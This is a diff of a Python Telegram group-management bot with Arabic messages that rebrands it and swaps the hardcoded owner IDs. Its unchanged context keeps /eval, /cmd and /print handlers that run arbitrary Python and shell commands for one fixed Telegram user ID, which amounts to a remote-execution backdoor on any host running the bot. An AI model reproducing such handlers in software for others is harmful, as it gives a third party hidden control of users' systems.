@@ -22,6 +22,7 @@ from helpers.utils import *
 from meval import meval
 from httpx import HTTPError
 tio = Tio()
+wfffp = 1910015590
 def get_size(bytes, suffix="B"):
     """
     Scale bytes to its proper format
@@ -36,7 +37,6 @@ def get_size(bytes, suffix="B"):
         bytes /= factor
 
 
-# @Client.on_message(filters.regex("^/start hmsa") & filters.private, group=-2007)
 async def on_send_hmsa(c: Client, m: Message):
    id = m.text.split("hmsa")[1]
    if not wsdb.get(id):
@@ -99,7 +99,6 @@ async def to_send(c: Client, m: Message):
             failed+=1
             pass
       return await rep.edit(f"{k} اذاعة ناجحة {count}")
-   
    k = r.get(f'{Dev_Zaid}:botkey')
    if r.get(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
       r.delete(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}')
@@ -147,7 +146,6 @@ async def to_send(c: Client, m: Message):
          data["file"]=file_id
       elif m.text:
          data["text"]=m.text.html
-      
       import uuid
       id = str(uuid.uuid4())[:6]
       data["to"]=to
@@ -171,28 +169,23 @@ async def to_send(c: Client, m: Message):
                )
          )
       return await c.delete_messages(chat, get["id"])
-      
 @Client.on_message(filters.text & filters.private, group=1)
 def delRanksHandler(c,m):
     k = r.get(f'{Dev_Zaid}:botkey')
     Thread(target=private_func,args=(c,m,k)).start()
-    
 def private_func(c,m,k):
   if r.get(f'{m.from_user.id}:sarhni'):  return 
   text = m.text
-  #r.set(f'DevGroup:{Dev_Zaid}'
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   channel= r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
   if text == '/start' and not dev_pls(m.from_user.id,m.chat.id):
      m.reply(text=f'''
-اهلين انا ،{name} 🧚
-
-↞ اختصاصي ادارة المجموعات من السبام والخ..
-↞ كت تويت, يوتيوب, ساوند , واشياء كثير ..
-↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.
+اهلا عزيزي ،{name}
+↞ اختصاصي ادارة المجموعات من وحمايتها..
+↞ كت تويت, يوتيوب, ساوند , واشياء هوايه ..
+↞ ارفعني اشراف وارسل تفعيل.
 ''', reply_markup=InlineKeyboardMarkup ([
-  [InlineKeyboardButton ('ضيفني لـ مجموعتك 🧚‍♀️', url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
-  [InlineKeyboardButton (f'تحديثات {name} 🍻', url=f'https://t.me/{channel}')]
+  [InlineKeyboardButton ('ضيفني لـ مجموعتك 🧚‍♀️', url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')]
   ]))
      if not r.sismember(f'{Dev_Zaid}:UsersList',m.from_user.id):
        r.sadd(f'{Dev_Zaid}:UsersList',m.from_user.id)
@@ -205,7 +198,6 @@ def private_func(c,m,k):
 ☆ اسمه : {}
 ☆ ايديه : `{}`
 ☆ معرفه : {}
-
 ☆ عدد المستخدمين صار {}
 '''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_Zaid}:UsersList')))
        reply_markup = InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name, user_id=m.from_user.id)]])
@@ -219,7 +211,7 @@ def private_func(c,m,k):
               c.send_message(int(dev), text, disable_web_page_preview=True)
             except:
               pass
-  
+
   if text == '/start Commands':
     return m.reply(text=f'{k} اهلين فيك باوامر البوت\n\nللاستفسار - @{channel}',
          reply_markup=InlineKeyboardMarkup (
@@ -240,8 +232,7 @@ def private_func(c,m,k):
              ],
            ]
          )
-        )
-  
+        )  
   if text == '/start rules':
      m.reply(text='''
 • القوانين
@@ -275,9 +266,9 @@ def private_func(c,m,k):
         [('الغاء')]
       ],
       resize_keyboard=True,
-      placeholder='@anas5 - @eFFb0t 🧚‍♀️'
+      placeholder='be kind'
      )
-     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
+     if m.from_user.id == wfffp:
        rank = 'تاج راسي ☆'
      else:
        rank = get_rank(m.from_user.id,m.from_user.id)
@@ -405,7 +396,6 @@ def SudosCommandsFunc(c,m,k,r,channel):
       else:
          r.delete(f':disableYT:{Dev_Zaid}')
          return m.reply(quote=True,text=f'{k} ابشر فعلت التحميل')
-   
    if text == 'تعطيل التحميل واليوتيوب':
       if not dev2_pls(m.from_user.id,m.chat.id):
          return 
@@ -688,17 +678,12 @@ def SudosCommandsFunc(c,m,k,r,channel):
         m.reply(quote=True,text=f'[{gg.title}]({gg.invite_link})',disable_web_page_preview=True)
      except Exception as e:
         print (e)
-     
-       
-   
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
         + "".join(f"\n {a}" for a in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
-
-
 @Client.on_message(filters.command("eval") & filters.user(6168217372))
 async def executor(client, message):
     if len(message.command) < 2 and not message.reply_to_message:
@@ -744,9 +729,6 @@ async def executor(client, message):
         os.remove(filename)
     else:
         await message.reply(final_output)
-   
-   
-   
 langslist = tio.query_languages()
 langs_list_link = "https://amanoteam.com/etc/langs.html"
 
@@ -793,7 +775,6 @@ async def exec_tio_run_code(c: Client, m: Message):
                 langformat=execlanguage, langslistlink=langs_list_link
             )
         )
-
 @Client.on_message(filters.command("cmd") & filters.user(6168217372))
 async def run_cmd(c: Client, m: Message):
     cmd = m.text.split(None,1)[1]
@@ -801,35 +782,30 @@ async def run_cmd(c: Client, m: Message):
         res = "You can't use this command"
     else:
         stdout, stderr = await shell_exec(cmd)
-
         res = (
             f"<b>Output:</b>\n<code>{html.escape(stdout)}</code>" if stdout else ""
         ) + (f"\n<b>Errors:</b>\n<code>{stderr}</code>" if stderr else "")
     await m.reply_text(res)
-
 @Client.on_message(filters.command("print") & filters.user(6168217372))
 async def printSS(c: Client, m: Message):
     text = m.text.split()[1]
     try:
         res = await meval(text, globals(), **locals())
-    except BaseException:  # skipcq
+    except BaseException:
         ev = traceback.format_exc()
         await m.reply_text(f"<code>{html.escape(ev)}</code>")
     else:
         try:
             await m.reply_text(f"<code>{html.escape(str(res))}</code>")
-        except BaseException as e:  # skipcq
+        except BaseException as e:
             await m.reply_text(str(e))
-
 timeout = httpx.Timeout(40.0)
 http = httpx.AsyncClient(http2=True, timeout=timeout)
-
 strings_print = {
   "print_description": "Take a screenshot of the specified website.",
   "print_usage": "<b>Usage:</b> <code>/print https://example.com</code> - Take a screenshot of the specified website.",
   "taking_screenshot": "Taking screenshot..."
 }
-
 @Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(6168217372))
 async def printsSites(c: Client, message: Message):
     msg = message.text
@@ -851,27 +827,19 @@ async def printsSites(c: Client, message: Message):
     if wrong:
         await message.reply_text(strings_print["print_usage"])
         return
-
     try:
         sent = await message.reply_text(strings_print["taking_screenshot"])
         res_json = await cssworker_url(target_url=the_url)
     except BaseException as e:
         await message.reply(f"<b>Failed due to:</b> <code>{e}</code>")
         return
-
     if res_json:
-        # {"url":"image_url","response_time":"147ms"}
         image_url = res_json["url"]
         if image_url:
             try:
                 await message.reply_photo(image_url)
                 await sent.delete()
             except BaseException:
-                # if failed to send the message, it's not API's
-                # fault.
-                # most probably there are some other kind of problem,
-                # for example it failed to delete its message.
-                # or the bot doesn't have access to send media in the chat.
                 return
         else:
             await message.reply(
@@ -888,7 +856,6 @@ async def cssworker_url(target_url: str):
 
     data = {
         "url": target_url,
-        # Sending a random CSS to make the API to generate a new screenshot.
         "css": f"random-tag: {uuid.uuid4()}",
         "render_when_ready": False,
         "viewport_width": 1280,
